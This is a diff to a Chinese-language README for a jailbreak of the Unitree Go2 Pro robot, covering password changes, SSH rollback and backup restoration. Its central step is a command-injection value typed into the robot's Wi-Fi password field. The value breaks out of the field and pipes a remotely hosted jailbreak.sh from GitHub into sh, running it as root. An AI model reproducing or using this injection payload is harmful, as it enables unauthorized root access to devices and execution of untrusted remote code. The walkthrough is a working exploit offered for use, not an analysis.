@@ -2,8 +2,8 @@
 jailbreak_Unitree_Go2Pro
 
 
-📝 使用步骤
-1. 修改密码
+# 📝 使用步骤
+## 1. 修改密码
 将脚本中的两处 `your_strong_password_here` 改成你的密码：
 ```
 # 第 68 行左右
@@ -19,21 +19,18 @@ echo "echo 'root:MySecurePass123!' | chpasswd" >> "$FILE"
 包含大小写字母、数字、特殊符号
 例如：`Go2Robot@2024!`
 
-2. 上传到 GitHub
+## 2. 上传到 GitHub
 脚本已经在：`https://raw.githubusercontent.com/tkdggg/jailbreak_Unitree_Go2Pro/main/jailbreak.sh`
-运行命令：
-```
-wifi_pass";curl -L https://raw.githubusercontent.com/tkdggg/jailbreak_Unitree_Go2Pro/main/jailbreak.sh|sh;#
 
 
-### 3. 执行越狱
+## 3. 执行越狱
 
 在机器人的 Wi-Fi 设置界面，密码框输入：
-
+```
 你的WiFi密码";curl -L https://raw.githubusercontent.com/tkdggg/jailbreak_Unitree_Go2Pro/main/jailbreak.sh|sh;#
 ```
-🔄 如何回滚
-方法 1: `SSH` 连接后回滚
+# 🔄 如何回滚
+## 1: `SSH` 连接后回滚
 ```
 # 连接到机器人
 ssh root@机器人IP
@@ -45,7 +42,7 @@ ssh root@机器人IP
 reboot
 ```
 
-方法 2: 查看备份内容
+## 2: 查看备份内容
 ```
 # 查看备份了什么
 ls -la /root/backup_before_jailbreak/
@@ -57,7 +54,7 @@ cat /root/backup_before_jailbreak/backup_info.txt
 cat /root/backup_before_jailbreak/sshd_config.original
 ```
 
-方法 3: 手动恢复（如果脚本失败）
+## 3: 手动恢复（如果脚本失败）
 ```
 # 恢复SSH配置
 cp /root/backup_before_jailbreak/sshd_config.original /etc/ssh/sshd_config
@@ -71,34 +68,35 @@ cp /root/backup_before_jailbreak/deb_update.sh.original /unitree/var/data/deb_up
 # 重启SSH
 systemctl restart ssh
 ```
-⚠️ 重要提醒
+# ⚠️ 重要提醒
 
-1.备份位置: `/root/backup_before_jailbreak/`
+## 1.备份位置: 
+`/root/backup_before_jailbreak/`
 
 首次运行才会创建备份
 重复运行不会覆盖原始备份
 
 
-2.密码位置: 脚本中两处需要改
+## 2.密码位置: 脚本中两处需要改
 
 第 68 行：立即生效的密码
 第 88 行：重启后生效的密码（必须一致）
 
 
-3.回滚限制:
+## 3.回滚限制:
 
 只能回滚到首次越狱前的状态
 如果多次修改，只保留最初的备份
 
 
-4.保存信息:
+## 4.保存信息:
 
 登录后可以查看 `/root/README` 了解越狱信息
 备份目录有完整的恢复说明
 
 
 
-🔍 验证脚本
+# 🔍 验证脚本
 连接后可以验证：
 ```
 # 检查备份是否存在
